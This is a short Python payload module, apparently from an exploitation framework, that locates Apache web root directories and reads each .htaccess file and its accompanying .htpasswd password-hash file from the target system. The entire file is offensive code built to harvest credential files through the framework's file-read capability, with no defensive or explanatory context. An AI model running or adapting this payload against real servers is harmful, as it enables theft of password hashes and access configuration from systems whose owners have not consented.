#REQUIRE_LINUX
#This payload shows Apache distributed configuration files (.htaccess & .htpasswd)
import re

result = []

def parse_htaccess(config_file):
    htaccess = re.search('(?<=AccessFileName )(.*)', config_file )
    if htaccess:
        return htaccess.group(1)
    else:
        return ''

apache_config = run_payload('apache_config')
htaccess = '.htaccess'
if apache_config:
    for line in apache_config:
        if parse_htaccess(line) != '':
            htaccess = parse_htaccess(line)


apache_root = run_payload('apache_root_directory')
if apache_root:
    for dir in apache_root:
        if htaccess and read(dir+htaccess):
            result.append('File => '+dir+htaccess)
            result.append(read(dir+htaccess))
            result.append('File => '+dir+'.htpasswd')
            result.append(read(dir+'.htpasswd'))
